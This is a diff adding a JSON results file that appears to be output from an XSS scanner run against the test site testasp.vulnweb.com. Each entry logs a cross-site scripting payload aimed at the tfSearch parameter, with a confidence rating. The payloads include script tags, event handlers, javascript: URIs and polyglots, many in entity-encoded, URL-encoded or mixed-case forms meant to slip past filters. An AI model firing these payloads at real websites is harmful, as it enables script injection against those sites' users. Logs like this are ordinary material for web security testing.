@@ -1,0 +1,1407 @@
+{
+  "payloads": [
+    {
+      "payload": "<svg><animate onbegin=alert(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:43.431635"
+    },
+    {
+      "payload": "<&#115;&#118;&#103;><&#97;&#110;&#105;&#109;&#97;&#116;&#101; &#111;&#110;&#98;&#101;&#103;&#105;&#110;=&#97;&#108;&#101;&#114;&#116;(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:43.777957"
+    },
+    {
+      "payload": "javascript%3Aalert%281%29",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Low",
+      "timestamp": "2026-05-10T12:51:43.803066"
+    },
+    {
+      "payload": "javascript:alert(1)",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:43.841513"
+    },
+    {
+      "payload": "<sVG><aNiMaTe onbeGin=alert(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:43.845924"
+    },
+    {
+      "payload": "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:&#97;&#108;&#101;&#114;&#116;(1)",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:43.969988"
+    },
+    {
+      "payload": "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:44.167725"
+    },
+    {
+      "payload": "JavaScriPt:alERt(1)",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:44.176157"
+    },
+    {
+      "payload": "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;(1)",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:44.203703"
+    },
+    {
+      "payload": "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alErt(1)",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:44.265458"
+    },
+    {
+      "payload": "\"><script>alert(1)</script>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:44.517800"
+    },
+    {
+      "payload": "\"><ScrIpt>alert(1)</scRiPt>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:44.535442"
+    },
+    {
+      "payload": "\"><&#115;&#99;&#114;&#105;&#112;&#116;>&#97;&#108;&#101;&#114;&#116;(1)</&#115;&#99;&#114;&#105;&#112;&#116;>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:44.539398"
+    },
+    {
+      "payload": "jaVasCript:/*-/*`/*\\`/*\"</img></noscript></title></textarea></style></template>--><img src=x onerror=alert(1)>\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:44.826272"
+    },
+    {
+      "payload": "jaVasCript%3A%2F%2A-%2F%2A%60%2F%2A%5C%60%2F%2A%22%3C%2Fimg%3E%3C%2Fnoscript%3E%3C%2Ftitle%3E%3C%2Ftextarea%3E%3C%2Fstyle%3E%3C%2Ftemplate%3E--%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%22%3E",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Low",
+      "timestamp": "2026-05-10T12:51:44.847413"
+    },
+    {
+      "payload": "JAvAsCRipt:/*-/*`/*\\`/*\"</imG></nOsCRIPT></TITLE></tExtARea></StYlE></TEmPLATe>--><imG SrC=X oNErROr=alerT(1)>\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:45.237011"
+    },
+    {
+      "payload": "jaVasCript:/*-/*`/*\\\\`/*\"</img></noscript></title></textarea></style></template>--><img src=x onerror=alert(1)>\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:45.250935"
+    },
+    {
+      "payload": "&#106;&#97;&#86;&#97;&#115;&#67;&#114;&#105;&#112;&#116;:/*-/*`/*\\`/*\"</&#105;&#109;&#103;></&#110;&#111;&#115;&#99;&#114;&#105;&#112;&#116;></&#116;&#105;&#116;&#108;&#101;></&#116;&#101;&#120;&#116;&#97;&#114;&#101;&#97;></&#115;&#116;&#121;&#108;&#101;></&#116;&#101;&#109;&#112;&#108;&#97;&#116;&#101;>--><&#105;&#109;&#103; &#115;&#114;&#99;=&#120; &#111;&#110;&#101;&#114;&#114;&#111;&#114;=&#97;&#108;&#101;&#114;&#116;(1)>\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:45.262491"
+    },
+    {
+      "payload": "\"><Img src=X oNErROR=ALeRT(1)//>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:45.559858"
+    },
+    {
+      "payload": "\"><&#105;&#109;&#103; &#115;&#114;&#99;=&#120; &#111;&#110;&#101;&#114;&#114;&#111;&#114;=&#97;&#108;&#101;&#114;&#116;(1)//>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:45.599510"
+    },
+    {
+      "payload": "\"><img src=x onerror=alert(1)//>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:46.052546"
+    },
+    {
+      "payload": "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:46.061610"
+    },
+    {
+      "payload": "%3&#67;&#115;&#99;&#114;&#105;&#112;&#116;%3&#69;&#97;&#108;&#101;&#114;&#116;%281%29%3&#67;%2&#70;&#115;&#99;&#114;&#105;&#112;&#116;%3&#69;",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:46.064873"
+    },
+    {
+      "payload": "<a href=\"javascript:alert(1)\">click</a>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:47.122313"
+    },
+    {
+      "payload": "<A hReF=\"JAvascrIpT:ALeRt(1)\">cLIcK</A>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:47.147864"
+    },
+    {
+      "payload": "<&#97; &#104;&#114;&#101;&#102;=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:&#97;&#108;&#101;&#114;&#116;(1)\">&#99;&#108;&#105;&#99;&#107;</&#97;>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:47.164132"
+    },
+    {
+      "payload": "<form action=\"javascript:alert(1)\"><input type=\"submit\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:47.450790"
+    },
+    {
+      "payload": "<&#102;&#111;&#114;&#109; &#97;&#99;&#116;&#105;&#111;&#110;=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:&#97;&#108;&#101;&#114;&#116;(1)\"><&#105;&#110;&#112;&#117;&#116; &#116;&#121;&#112;&#101;=\"&#115;&#117;&#98;&#109;&#105;&#116;\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:47.492676"
+    },
+    {
+      "payload": "<fORm AcTIoN=\"jAvAScrIpT:alert(1)\"><inPUT type=\"SubmIT\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:47.502491"
+    },
+    {
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:47.510133"
+    },
+    {
+      "payload": "<&#105;&#102;&#114;&#97;&#109;&#101; &#115;&#114;&#99;=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:&#97;&#108;&#101;&#114;&#116;(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:47.818996"
+    },
+    {
+      "payload": "<object data=\"javascript:alert(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:47.854108"
+    },
+    {
+      "payload": "<IFraME SRc=\"JaVascrIpt:AlErt(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:47.881773"
+    },
+    {
+      "payload": "<&#111;&#98;&#106;&#101;&#99;&#116; &#100;&#97;&#116;&#97;=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:&#97;&#108;&#101;&#114;&#116;(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:48.128537"
+    },
+    {
+      "payload": "<obJeCT dATa=\"JAvaScRIPt:ALerT(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:48.138792"
+    },
+    {
+      "payload": "<embed src=\"javascript:alert(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:48.199273"
+    },
+    {
+      "payload": "<&#101;&#109;&#98;&#101;&#100; &#115;&#114;&#99;=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:&#97;&#108;&#101;&#114;&#116;(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:48.208436"
+    },
+    {
+      "payload": "<EmBeD SRC=\"JAvascrIpT:aLeRt(1)\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:48.443814"
+    },
+    {
+      "payload": "<script>alert(1)</script>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.118921"
+    },
+    {
+      "payload": "<&#115;&#99;&#114;&#105;&#112;&#116;>&#97;&#108;&#101;&#114;&#116;(1)</&#115;&#99;&#114;&#105;&#112;&#116;>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.134389"
+    },
+    {
+      "payload": "<scriPt>aLert(1)</ScRIPT>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.146419"
+    },
+    {
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.161576"
+    },
+    {
+      "payload": "<&#115;&#99;&#114;&#105;&#112;&#116;>&#97;&#108;&#101;&#114;&#116;(&#83;&#116;&#114;&#105;&#110;&#103;.&#102;&#114;&#111;&#109;&#67;&#104;&#97;&#114;&#67;&#111;&#100;&#101;(88,83,83))</&#115;&#99;&#114;&#105;&#112;&#116;>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.171531"
+    },
+    {
+      "payload": "<sCriPt>AleRT(STriNg.fromchArcodE(88,83,83))</ScRIpt>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.182782"
+    },
+    {
+      "payload": "<img src=x onerror=alert(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.191757"
+    },
+    {
+      "payload": "<&#105;&#109;&#103; &#115;&#114;&#99;=&#120; &#111;&#110;&#101;&#114;&#114;&#111;&#114;=&#97;&#108;&#101;&#114;&#116;(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.211057"
+    },
+    {
+      "payload": "<iMG srC=x oNerror=aLErt(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.222242"
+    },
+    {
+      "payload": "<svg onload=alert(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.232973"
+    },
+    {
+      "payload": "<&#115;&#118;&#103; &#111;&#110;&#108;&#111;&#97;&#100;=&#97;&#108;&#101;&#114;&#116;(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.250502"
+    },
+    {
+      "payload": "<svG onLoAD=alErT(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.259959"
+    },
+    {
+      "payload": "<body onload=alert(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.265501"
+    },
+    {
+      "payload": "<&#98;&#111;&#100;&#121; &#111;&#110;&#108;&#111;&#97;&#100;=&#97;&#108;&#101;&#114;&#116;(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.271630"
+    },
+    {
+      "payload": "<BOdy oNLoad=ALert(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.288372"
+    },
+    {
+      "payload": "<input onfocus=alert(1) autofocus>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.301879"
+    },
+    {
+      "payload": "<&#105;&#110;&#112;&#117;&#116; &#111;&#110;&#102;&#111;&#99;&#117;&#115;=&#97;&#108;&#101;&#114;&#116;(1) &#97;&#117;&#116;&#111;&#102;&#111;&#99;&#117;&#115;>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.310289"
+    },
+    {
+      "payload": "<iNPUt OnfoCUs=AlERt(1) aUTOFocuS>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.330476"
+    },
+    {
+      "payload": "<marquee onstart=alert(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.343313"
+    },
+    {
+      "payload": "<&#109;&#97;&#114;&#113;&#117;&#101;&#101; &#111;&#110;&#115;&#116;&#97;&#114;&#116;=&#97;&#108;&#101;&#114;&#116;(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.359656"
+    },
+    {
+      "payload": "<mArquEe oNsTARt=ALErt(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.368063"
+    },
+    {
+      "payload": "<details open ontoggle=alert(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.377816"
+    },
+    {
+      "payload": "<&#100;&#101;&#116;&#97;&#105;&#108;&#115; &#111;&#112;&#101;&#110; &#111;&#110;&#116;&#111;&#103;&#103;&#108;&#101;=&#97;&#108;&#101;&#114;&#116;(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.392775"
+    },
+    {
+      "payload": "<DeTaIls OPen OnTOGglE=aLERT(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.397097"
+    },
+    {
+      "payload": "<svg><animate onbegin=alert(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.409218"
+    },
+    {
+      "payload": "<&#115;&#118;&#103;><&#97;&#110;&#105;&#109;&#97;&#116;&#101; &#111;&#110;&#98;&#101;&#103;&#105;&#110;=&#97;&#108;&#101;&#114;&#116;(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.424043"
+    },
+    {
+      "payload": "<sVG><aNiMaTe onbeGin=alert(1)>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.444325"
+    },
+    {
+      "payload": "javascript:alert(1)",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.447569"
+    },
+    {
+      "payload": "javascript%3Aalert%281%29",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Low",
+      "timestamp": "2026-05-10T12:51:49.463602"
+    },
+    {
+      "payload": "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:&#97;&#108;&#101;&#114;&#116;(1)",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.474046"
+    },
+    {
+      "payload": "JavaScriPt:alERt(1)",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.484216"
+    },
+    {
+      "payload": "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.494200"
+    },
+    {
+      "payload": "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;(1)",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.502984"
+    },
+    {
+      "payload": "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alErt(1)",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.514510"
+    },
+    {
+      "payload": "\"><script>alert(1)</script>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.523225"
+    },
+    {
+      "payload": "\"><&#115;&#99;&#114;&#105;&#112;&#116;>&#97;&#108;&#101;&#114;&#116;(1)</&#115;&#99;&#114;&#105;&#112;&#116;>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.537505"
+    },
+    {
+      "payload": "\"><ScrIpt>alert(1)</scRiPt>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.552253"
+    },
+    {
+      "payload": "jaVasCript:/*-/*`/*\\`/*\"</img></noscript></title></textarea></style></template>--><img src=x onerror=alert(1)>\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.577242"
+    },
+    {
+      "payload": "jaVasCript%3A%2F%2A-%2F%2A%60%2F%2A%5C%60%2F%2A%22%3C%2Fimg%3E%3C%2Fnoscript%3E%3C%2Ftitle%3E%3C%2Ftextarea%3E%3C%2Fstyle%3E%3C%2Ftemplate%3E--%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%22%3E",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Low",
+      "timestamp": "2026-05-10T12:51:49.580851"
+    },
+    {
+      "payload": "&#106;&#97;&#86;&#97;&#115;&#67;&#114;&#105;&#112;&#116;:/*-/*`/*\\`/*\"</&#105;&#109;&#103;></&#110;&#111;&#115;&#99;&#114;&#105;&#112;&#116;></&#116;&#105;&#116;&#108;&#101;></&#116;&#101;&#120;&#116;&#97;&#114;&#101;&#97;></&#115;&#116;&#121;&#108;&#101;></&#116;&#101;&#109;&#112;&#108;&#97;&#116;&#101;>--><&#105;&#109;&#103; &#115;&#114;&#99;=&#120; &#111;&#110;&#101;&#114;&#114;&#111;&#114;=&#97;&#108;&#101;&#114;&#116;(1)>\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.585506"
+    },
+    {
+      "payload": "jaVasCript:/*-/*`/*\\\\`/*\"</img></noscript></title></textarea></style></template>--><img src=x onerror=alert(1)>\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.590308"
+    },
+    {
+      "payload": "JAvAsCRipt:/*-/*`/*\\`/*\"</imG></nOsCRIPT></TITLE></tExtARea></StYlE></TEmPLATe>--><imG SrC=X oNErROr=alerT(1)>\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.596914"
+    },
+    {
+      "payload": "\"><img src=x onerror=alert(1)//>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.605068"
+    },
+    {
+      "payload": "\"><&#105;&#109;&#103; &#115;&#114;&#99;=&#120; &#111;&#110;&#101;&#114;&#114;&#111;&#114;=&#97;&#108;&#101;&#114;&#116;(1)//>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.609889"
+    },
+    {
+      "payload": "\"><Img src=X oNErROR=ALeRT(1)//>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "High",
+      "timestamp": "2026-05-10T12:51:49.614533"
+    },
+    {
+      "payload": "%3&#67;&#115;&#99;&#114;&#105;&#112;&#116;%3&#69;&#97;&#108;&#101;&#114;&#116;%281%29%3&#67;%2&#70;&#115;&#99;&#114;&#105;&#112;&#116;%3&#69;",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.627201"
+    },
+    {
+      "payload": "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.632502"
+    },
+    {
+      "payload": "<a href=\"javascript:alert(1)\">click</a>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.636183"
+    },
+    {
+      "payload": "<&#97; &#104;&#114;&#101;&#102;=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:&#97;&#108;&#101;&#114;&#116;(1)\">&#99;&#108;&#105;&#99;&#107;</&#97;>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.640414"
+    },
+    {
+      "payload": "<A hReF=\"JAvascrIpT:ALeRt(1)\">cLIcK</A>",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.653210"
+    },
+    {
+      "payload": "<form action=\"javascript:alert(1)\"><input type=\"submit\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.668942"
+    },
+    {
+      "payload": "<&#102;&#111;&#114;&#109; &#97;&#99;&#116;&#105;&#111;&#110;=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:&#97;&#108;&#101;&#114;&#116;(1)\"><&#105;&#110;&#112;&#117;&#116; &#116;&#121;&#112;&#101;=\"&#115;&#117;&#98;&#109;&#105;&#116;\">",
+      "context": "html",
+      "url": "http://testasp.vulnweb.com/Search.asp",
+      "parameter": "tfSearch",
+      "confidence": "Medium",
+      "timestamp": "2026-05-10T12:51:49.674248"
+    },
+    {
+      "payload": "<fORm AcTIoN=\"jAvAScrIpT:alert(1)\"><inPUT type=\"SubmIT\">",
+      "context": "html",
